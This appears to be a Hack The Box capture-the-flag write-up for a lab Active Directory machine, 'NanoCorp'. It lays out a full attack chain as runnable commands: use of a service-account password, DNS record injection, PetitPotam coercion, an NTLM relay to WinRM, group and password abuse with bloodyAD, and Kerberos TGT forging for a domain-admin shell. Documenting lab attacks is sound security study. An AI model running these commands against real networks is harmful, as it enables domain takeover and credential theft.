# NanoCorp HTB — Red Team Active Directory Writeup

## Initial Foothold — Service Account Abuse

Valid domain credentials for a service account were identified:

```text
NANOCORP.HTB\WEB_SVC
Password: dksehdgh712!@#
```

This account had sufficient privileges to interact with Active Directory-integrated DNS.

---

## AD DNS Manipulation — NTLM Relay Setup

### Tooling

```bash
git clone https://github.com/dirkjanm/krbrelayx
cd krbrelayx
```

### Malicious DNS Record Injection

A crafted DNS record was added to coerce authentication:

```bash
python3 dnstool.py   -u 'nanocorp.htb\WEB_SVC'   -p 'dksehdgh712!@#'   nanocorp.htb   -dc-ip 10.10.11.93   -dns-ip 10.10.11.93   -a add   -d 10.10.17.26   -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
```

This record is used later as a coercion target.

---

## NTLM Relay — WinRM Abuse

Start the NTLM relay listener targeting WinRM:

```bash
ntlmrelayx.py -smb2support -t winrms://10.10.11.93 -i
```

Trigger authentication coercion using PetitPotam:

```bash
nxc smb nanocorp.htb   -u WEB_SVC   -p 'dksehdgh712!@#'   -M coerce_plus   -o METHOD=Petitpotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

---

## Domain Compromise — Administrator Shell

Once the relay succeeds, connect to the interactive shell:

```bash
nc 127.0.0.1 11000
```

Retrieve the flag:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## Post-Exploitation — Active Directory Abuse

### Privilege Escalation via Group Membership

```bash
bloodyAD   --host dc01.nanocorp.htb   -d nanocorp.htb   -u web_svc   -p 'dksehdgh712!@#'   -k add groupMember IT_SUPPORT web_svc
```

---

### Password Reset on Service Account

```bash
bloodyAD   --host dc01.nanocorp.htb   -d nanocorp.htb   -u web_svc   -p 'dksehdgh712!@#'   -k set password monitoring_svc 'TestPass123@'
```

---

## Kerberos Abuse — AES Key & TGT Forging

### Generate AES Keys

```bash
python3 aesKrbKeyGen.py   -domain nanocorp.htb   -user web_svc   -pass 'dksehdgh712!@#'
```

```text
AES256: 5DD23766476492E9EF6AB7C4313DEF5F7104349295725CA9BD6C26065B8437B8
```

---

### Obtain TGT Using AES Key

```bash
impacket-getTGT   -aesKey 5DD23766476492E9EF6AB7C4313DEF5F7104349295725CA9BD6C26065B8437B8   nanocorp.htb/monitoring_svc
```

```bash
export KRB5CCNAME=monitoring_svc.ccache
```

---

## WinRM Access — Kerberos Authentication

> Time synchronization is mandatory for Kerberos.

```bash
faketime "$(ntpdate -q 10.10.11.93 | cut -d ' ' -f 1,2)" python3 evil_winrmexec.py   -ssl   -port 5986   NANOCORP.HTB/monitoring_svc@dc01.nanocorp.htb   -k   -spn HTTP/dc01.nanocorp.htb   -dc-ip 10.10.11.93
```

Successful authentication yields full domain-level shell access.

---

## Attack Chain Summary

1. Service account credential compromise  
2. AD-integrated DNS record injection  
3. NTLM authentication coercion (PetitPotam)  
4. NTLM relay to WinRM (Domain Controller)  
5. Domain Admin shell obtained  
6. Abuse of AD object control via BloodyAD  
7. Kerberos AES key extraction and TGT forging  
8. Persistent WinRM access via Kerberos  

---

## Red Team Assessment

This environment failed at multiple critical AD security controls:

- Over-privileged service accounts
- Insecure AD DNS permissions
- NTLM authentication enabled
- WinRM exposed on Domain Controller
- Weak Kerberos hardening

**Result:** Full Active Directory compromise with lateral persistence.

---

**Forest Owned — Domain Dominated 🏴‍☠️**
